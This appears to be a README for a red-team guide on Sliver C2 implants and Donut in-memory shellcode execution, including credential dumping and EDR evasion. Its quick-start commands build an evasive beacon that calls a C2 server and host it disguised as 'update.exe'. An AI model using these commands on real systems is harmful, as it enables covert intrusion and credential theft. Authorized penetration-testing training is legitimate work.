# Sliver + Donut Integration Guide

A comprehensive visual guide covering C2 shellcode generation and in-memory execution techniques using Sliver and Donut.

## 📚 Available Formats

This guide is available in multiple formats for your convenience:

- **📄 [sliver-donut-guide.md](sliver-donut-guide.md)** - Markdown format (GitHub-friendly, easy to edit)
- **🌐 [sliver-donut-guide.html](sliver-donut-guide.html)** - Interactive HTML with styling
- **🖼️ [sliver-donut-guide.png](sliver-donut-guide.png)** - High-resolution image (1920x5974px)
- **📕 [sliver-donut-guide.pdf](sliver-donut-guide.pdf)** - Printable PDF document

## 📖 What's Covered

### Core Workflows
- **Basic 3-step workflow** for Sliver implant generation and execution
- **Complete 7-step beacon deployment** via HTTP with website hosting
- **Donut integration** for converting .NET assemblies to shellcode

### Generation Options
- All operating systems (Windows, Linux, macOS)
- All architectures (x64, x86, ARM64, ARM32)
- All format types (exe, shared libraries, shellcode, service)
- Connection protocols (mTLS, HTTP/HTTPS, DNS, WireGuard)
- Evasion and obfuscation flags

### Platform-Specific Examples
- **Windows:** 5 generation examples including DLLs, shellcode, services
- **Linux:** ELF binaries and shared objects (.so)
- **macOS:** Mach-O binaries, dylibs, Apple Silicon support

### Practical Donut Examples
1. **Mimikatz Execution** - Credential dumping
2. **Rubeus with Parameters** - Kerberoasting attacks
3. **Sacrificial Process** - Process hollowing techniques
4. **SharpHound Collection** - Active Directory enumeration
5. **Seatbelt Security Audit** - Host reconnaissance
6. **Multi-Stage Deployment** - Automation workflows

### Advanced Techniques
- Process injection methods (PID-based, RWX pages, named processes)
- Multi-protocol C2 configurations
- Custom implant naming and debugging
- In-memory .NET assembly execution

## 🎯 Key Benefits

- ✅ **In-Memory Execution** - No files touch disk
- ✅ **.NET Assembly Support** - Run C# tools seamlessly
- ✅ **AMSI Bypass** - Built-in anti-malware evasion
- ✅ **Process Flexibility** - Inject into any process
- ✅ **EDR Evasion** - Harder to detect than file-based execution
- ✅ **Position Independent** - Shellcode runs anywhere in memory
- ✅ **Cross-Platform** - Windows, Linux, and macOS support

## 🛠️ Tools Referenced

- **[Sliver](https://github.com/BishopFox/sliver)** - Modern C2 framework by BishopFox
- **[Donut](https://github.com/TheWover/donut)** - Shellcode generation framework
- **[Mimikatz](https://github.com/gentilkiwi/mimikatz)** - Credential extraction tool
- **[Rubeus](https://github.com/GhostPack/Rubeus)** - Kerberos interaction toolkit
- **[SharpHound](https://github.com/BloodHoundAD/SharpHound)** - Active Directory collector
- **[Seatbelt](https://github.com/GhostPack/Seatbelt)** - Security audit tool

## ⚠️ Legal & Ethical Use

**IMPORTANT:** These techniques should **ONLY** be used in:

- ✅ Authorized penetration testing engagements
- ✅ Red team exercises with proper written consent
- ✅ Controlled lab environments (HackTheBox, TryHackMe, personal labs)
- ✅ Security research with appropriate permissions

**Unauthorized access to computer systems is illegal** under laws like the Computer Fraud and Abuse Act (CFAA) and similar legislation worldwide.

## 🎓 Recommended Training Platforms

- [HackTheBox](https://www.hackthebox.com/) - Offensive security training
- [TryHackMe](https://tryhackme.com/) - Beginner-friendly security labs
- [Offensive Security](https://www.offensive-security.com/) - OSCP and advanced certifications
- [SANS Institute](https://www.sans.org/) - Professional security training

## 📝 Quick Start Example

```bash
# 1. Generate a Windows beacon
sliver > generate beacon --http your-server.com:8443 --os windows --evasion --save /tmp/

# 2. Start C2 listener
sliver > http --lhost 0.0.0.0 --lport 8443

# 3. Host payload on website
sliver > websites add-content --website mysite --web-path /download/update.exe --content /tmp/BEACON_NAME.exe

# 4. Start website server
sliver > http --website mysite --lhost 0.0.0.0 --lport 80

# 5. Wait for callback
sliver > beacons
```

## 🤝 Contributing

Feel free to contribute improvements, additional examples, or corrections by submitting pull requests or opening issues.

## 📄 License

This guide is provided for educational purposes only. Use responsibly and ethically.

---

**Created for security professionals, penetration testers, and red team operators**
